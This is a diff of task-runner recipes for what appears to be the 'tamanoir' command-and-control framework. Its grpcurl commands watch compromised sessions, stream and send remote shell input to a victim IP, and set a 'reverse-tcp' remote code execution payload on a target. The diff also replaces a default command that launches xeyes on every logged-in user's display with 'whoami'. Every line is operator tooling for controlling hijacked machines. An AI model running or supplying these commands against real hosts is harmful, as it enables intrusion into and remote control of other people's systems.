@@ -43,7 +43,7 @@ c2_watch:
     grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{}' '{{proxy_ip}}:50051' tamanoir.Session/WatchSessions
 c2_remote_shell_watch :
     grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{}' '{{proxy_ip}}:50051' tamanoir.RemoteShell/WatchShellStdOut
-c2_remote_shell_cmd cmd="who | awk '{print $1}' | sort -u | uniq |  while read user; do sudo -u "$user" DISPLAY=$DISPLAY xeyes&; done" session_ip="192.168.1.180":
+c2_remote_shell_cmd cmd="whoami" session_ip="192.168.1.180":
     grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{"message":"{{cmd}}","ip":"{{session_ip}}"}' '{{proxy_ip}}:50051' tamanoir.RemoteShell/SendShellStdIn
 c2_set_rce  session_ip="192.168.1.180" rce="reverse-tcp":
     grpcurl -plaintext  -proto tamanoir-common/proto/tamanoir/tamanoir.proto -d '{"ip":"{{session_ip}}","target_arch":"x86_64","rce":"{{rce}}"}' '{{proxy_ip}}:50051' tamanoir.Rce/SetSessionRce
